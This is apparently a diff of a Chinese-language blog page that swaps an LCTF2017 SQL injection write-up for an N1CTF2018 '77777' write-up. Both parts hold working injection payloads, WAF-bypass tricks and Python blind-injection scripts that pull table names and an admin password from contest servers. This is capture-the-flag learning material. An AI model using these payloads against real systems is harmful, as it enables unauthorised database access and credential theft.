@@ -79,18 +79,23 @@
 
 
 
-<meta name="description" content="通过lctf2017 writeup get到的姿势偶然在群里看到别人发的lctf2017 writeup,这个比赛自己没做,不过看了这篇writeup后照着思路做了一下题,学到了不少新的思路和姿势,激动万分 原文链接 url:http://182.254.246.93/entrance.php 这道题的思路首先是根据源代码中的提示判断这是一道注入题,注入点在pro_id上 &amp;lt;form me">
+<meta name="description" content="N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧 题目：77777题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通过lctf2017 writeup get思路">
-<meta property="og:url" content="http://yoursite.com/2017/11/20/lctf2017/index.html">
+<meta property="og:title" content="N1CTF2018 77777 writeup">
+<meta property="og:url" content="http://yoursite.com/2018/03/12/N1CTF2018/index.html">
 <meta property="og:site_name" content="Lawliet Blog">
-<meta property="og:description" content="通过lctf2017 writeup get到的姿势偶然在群里看到别人发的lctf2017 writeup,这个比赛自己没做,不过看了这篇writeup后照着思路做了一下题,学到了不少新的思路和姿势,激动万分 原文链接 url:http://182.254.246.93/entrance.php 这道题的思路首先是根据源代码中的提示判断这是一道注入题,注入点在pro_id上 &amp;lt;form me">
+<meta property="og:description" content="N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧 题目：77777题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-20T13:30:27.085Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim">
+<meta property="og:updated_time" content="2018-03-12T02:54:12.586Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="通过lctf2017 writeup get思路">
-<meta name="twitter:description" content="通过lctf2017 writeup get到的姿势偶然在群里看到别人发的lctf2017 writeup,这个比赛自己没做,不过看了这篇writeup后照着思路做了一下题,学到了不少新的思路和姿势,激动万分 原文链接 url:http://182.254.246.93/entrance.php 这道题的思路首先是根据源代码中的提示判断这是一道注入题,注入点在pro_id上 &amp;lt;form me">
+<meta name="twitter:title" content="N1CTF2018 77777 writeup">
+<meta name="twitter:description" content="N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧 题目：77777题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim">
 
 
 
@@ -120,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/11/20/lctf2017/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/03/12/N1CTF2018/"/>
 
 
 
 
 
-  <title>通过lctf2017 writeup get思路 | Lawliet Blog</title>
+  <title>N1CTF2018 77777 writeup | Lawliet Blog</title>
   
 
 
@@ -253,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/20/lctf2017/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/N1CTF2018/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lawliet">
@@ -270,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">通过lctf2017 writeup get思路</h1>
+          <h1 class="post-title" itemprop="name headline">N1CTF2018 77777 writeup</h1>
         
 
         <div class="post-meta">
@@ -282,8 +287,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-20T17:09:32+08:00">
-                2017-11-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T10:53:49+08:00">
+                2018-03-12
               </time>
             
 
@@ -305,8 +310,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
                   </a>
                 </span>
 
@@ -342,86 +347,49 @@
       
 
       
-        <h1 id="通过lctf2017-writeup-get到的姿势"><a href="#通过lctf2017-writeup-get到的姿势" class="headerlink" title="通过lctf2017 writeup get到的姿势"></a>通过lctf2017 writeup get到的姿势</h1><p><strong>偶然在群里看到别人发的lctf2017 writeup,这个比赛自己没做,不过看了这篇writeup后照着思路做了一下题,学到了不少新的思路和姿势,激动万分</strong></p>
-<p><strong><a href="https://mp.weixin.qq.com/s?srcid=11203xrbPM3MfT5t21QgBaj8&amp;scene=23&amp;mid=2247484338&amp;sn=33dc65055c9e00ce487f89c4c1ff4098&amp;idx=1&amp;__biz=MzIzMTc1MjExOQ%3D%3D&amp;chksm=e89e2b6adfe9a27c02fc3235f319f295871fac1dd2dc3490362d644493643664cd13643ba0f9&amp;mpshare=1#rd" title="原文链接" target="_blank" rel="external">原文链接</a></strong></p>
-<p><strong>url:<a href="http://182.254.246.93/entrance.php" title="http://182.254.246.93/entrance.php" target="_blank" rel="external">http://182.254.246.93/entrance.php</a></strong></p>
-<p><strong>这道题的思路首先是根据源代码中的提示判断这是一道注入题,注入点在pro_id上</strong></p>
-<pre><code>&lt;form method =&quot;POST&quot; action=&quot;entrance.php&quot;&gt;  
-&lt;p&gt;Do you want to know their secrets?&lt;/p&gt;
-&lt;p&gt;id:&lt;input id=&quot;pro_id&quot; name=&quot;pro_id&quot; type=&quot;text&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/p&gt;
-&lt;/form&gt; 
-&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p><strong>根据提示进行union查询,发现一些关键字被waf拦截了,过滤的关键字有<code>database()</code>,<code>version()</code>,<code>information_schema</code>等,然而很多注入都是基于<code>information_schema</code>这个数据库的,但是通过上面那篇pcat的文章,我学习到了新的姿势</strong></p>
-<p><strong>先在post参数pro_id上进行order by判断列数,发现当前数据表列数为4,然后构造payload</strong></p>
-<pre><code>pro_id=1 union select 1,2,3,4 from test
-</code></pre><p><strong>由于test表不存在,于是会爆出错误,错误中出现当前数据库的名字</strong></p>
-<pre><code>Table &apos;youcanneverfindme17.test&apos; doesn&apos;t exist
-</code></pre><p><strong>发现可以报错后,尝试用报错函数得到更多的数据,发现updatexml,extractvalue等XPATH报错函数对参数类型进行了严格的控制均不能使用,会出现<code>Only constant XPATH queries are supported</code>的提示,那么构造payload</strong></p>
-<pre><code>pro_id=1 and exp(~(select pro_id))
-</code></pre><p><strong>通过一个整数溢出的错误报出当前数据库的名字和表名,列名pro_id是通过post参数猜测出来的</strong></p>
-<pre><code>DOUBLE value is out of range in &apos;exp(~((select `youcanneverfindme17`.`product_2017ctf`.`pro_id`)))&apos;
-</code></pre><p><strong>接下来是爆出表下的列名,构造payload</strong></p>
-<pre><code>pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id))c)
-</code></pre><p><strong>这条语句通过pro_id字段连接两个相同的表,将会产生相同的列名,由于一个数据表不能有相同的列名,就会爆出<code>Duplicate column name</code>的错误，同时爆出列的名字,所以我们通过对一个不符合要求的表进行子查询,就会报错</strong></p>
-<pre><code>Duplicate column name &apos;pro_name&apos;
-</code></pre><p><strong>我们可以通过报出的错误信息遍历列名,payload</strong></p>
-<pre><code>pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id,pro_name))c)
-</code></pre><p><strong>继续报错</strong></p>
-<pre><code>Duplicate column name &apos;owner&apos;
-</code></pre><p><strong>构造payload遍历</strong></p>
-<pre><code>pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id,pro_name,owner))c)
-</code></pre><p><strong>回显出了和提示中符合的列名</strong></p>
-<pre><code>Duplicate column name &apos;d067a0fa9dc61a6e&apos;
-</code></pre><p><strong>但是从product_2017ctf表中对d067a0fa9dc61a6e字段内容进行union查询时发现d067a0fa9dc61a6e也被waf过滤了,从上篇文章中自己学到了一个很有意思的姿势,方法是盲注,pro_id=3的product name和题目连接的名字很相似,都为entrance,那么我们可以猜测flag的后半部分在pro_id为3的记录中,,因为d067a0fa9dc61a6e列为第四列,我们要提取他当中的内容,可以用<code>union select 1，2，3，字符串</code>进行盲注,通过order by desc降序,由于mysql比较字符串大小是根据字符ascii码比较的,所以如果我们的字符串的ascii码的值小于flag的ascii值,union查询的第一条记录便为union关键字前的查询结果,否则就会显示<code>select 1,2,3,字符串</code>的结果,也就是显示2(显示位在2上),所以通过显示结果的不同可以进行盲注,编写脚本</strong></p>
+        <h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong></p>
+<h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p>
+<p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<a href="http://47.97.168.223/#profile页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值" target="_blank" rel="external">http://47.97.168.223/#profile页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</a></strong></p>
+<pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;
+</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了</strong></p>
+<p><strong>题目的第二个提示</strong></p>
+<pre><code>the flag is `admin&apos;s password`:)
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p>
+<pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)
+</code></pre><p><strong>数据库语句变为:</strong></p>
+<pre><code>update users set points=任意数字 and （构造逻辑判断）
+</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p>
 <pre><code>import requests
 import string
-url=&quot;http://182.254.246.93/entrance.php&quot;
-list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]
-flaghead=&quot;d067a0fa9dc61a6e&quot;
-flagtail=&quot;&quot;
-while 1:
-for i in list:
-    payload={&quot;pro_id&quot;:&quot;3 union select 1,2,3,%s order by 4 desc&quot;%(&quot;0x&quot;+(flagtail+i).encode(&quot;hex&quot;))}
-    html=requests.post(url=url,data=payload).content
-    if html.find(&quot;nextentrance&quot;)==-1:
-        flagtail+=chr(ord(i)-1)
-        print flagtail
-        l2=len(flagtail)
-        break
-    else:
-        pass
-if flagtail.split(&quot;.&quot;)[-1]==&quot;PHP&quot;:
-    break
-flag=flaghead+flagtail.lower()
-print flag
-</code></pre><p><strong>得出flag</strong></p>
-<pre><code>C:\Users\I&apos;m possible\Desktop&gt;getflag.py
-7
-71
-719
-7195
-7195C
-7195CA
-7195CA9
-7195CA99
-7195CA996
-7195CA9969
-7195CA99696
-7195CA99696B
-7195CA99696B5
-7195CA99696B5A
-7195CA99696B5A8
-7195CA99696B5A89
-7195CA99696B5A896
-7195CA99696B5A896.
-7195CA99696B5A896.P
-7195CA99696B5A896.PH
-7195CA99696B5A896.PHP
-d067a0fa9dc61a6e7195ca99696b5a896.php
-</code></pre><p><strong>flag为下一关地址</strong></p>
+list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用
+url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面
+#read password
+#i=0
+#while 1:
+#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}
+#    html=requests.post(url=url,data=payload).content
+#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break
+#        print i
+#        break
+#    else:
+#        i=i+1
+#password length is 13
+#read password
+i=0
+for i in range(1,14):
+    for j in list:
+        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}
+        html=requests.post(url=url,data=payload).content
+        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break
+            print j
+            break
+#flag is HE3L3LOCAT233
+</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p>
+<p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p>
+<p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>
 
       
     </div>
@@ -452,8 +420,8 @@ d067a0fa9dc61a6e7195ca99696b5a896.php
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/12/error-base/" rel="next" title="mysql报错注入总结">
-                <i class="fa fa-chevron-left"></i> mysql报错注入总结
+              <a href="/2018/02/27/centos7mysql/" rel="next" title="centos7安装mysql">
+                <i class="fa fa-chevron-left"></i> centos7安装mysql
               </a>
             
           </div>
@@ -461,10 +429,6 @@ d067a0fa9dc61a6e7195ca99696b5a896.php
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/11/21/dedegetshell/" rel="prev" title="dedecmsv57 sp1远程文件包含漏洞">
-                dedecmsv57 sp1远程文件包含漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -602,7 +566,7 @@ d067a0fa9dc61a6e7195ca99696b5a896.php
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#通过lctf2017-writeup-get到的姿势"><span class="nav-number">1.</span> <span class="nav-text">通过lctf2017 writeup get到的姿势</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#N1CTF2018-77777-writeup"><span class="nav-number">1.</span> <span class="nav-text">N1CTF2018 77777 writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序"><span class="nav-number">1.0.1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目：77777"><span class="nav-number">1.0.2.</span> <span class="nav-text">题目：77777</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
